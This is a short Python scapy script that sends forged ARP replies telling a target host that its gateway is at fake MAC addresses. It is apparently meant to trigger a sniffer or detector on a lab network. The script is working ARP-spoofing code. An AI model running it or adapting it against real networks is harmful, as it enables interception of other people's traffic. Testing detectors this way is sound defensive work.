from scapy.all import ARP, send
import time

target_ip = "192.168.1.10"       # Pretend victim
fake_gateway_ip = "192.168.1.1"  # Pretend this is your router
mac_addresses = ["11:22:33:44:55:66", "aa:bb:cc:dd:ee:ff"]

print("[*] Simulating ARP spoofing...")

for mac in mac_addresses:
    packet = ARP(
        op=2,                 # ARP reply
        pdst=target_ip,       # Who we're spoofing
        psrc=fake_gateway_ip, # Who we claim to be
        hwsrc=mac             # Fake MAC
    )
    send(packet, verbose=False)
    print(f"[+] Sent spoofed ARP: {fake_gateway_ip} is at {mac}")
    time.sleep(3)  # Give your sniffer time to react
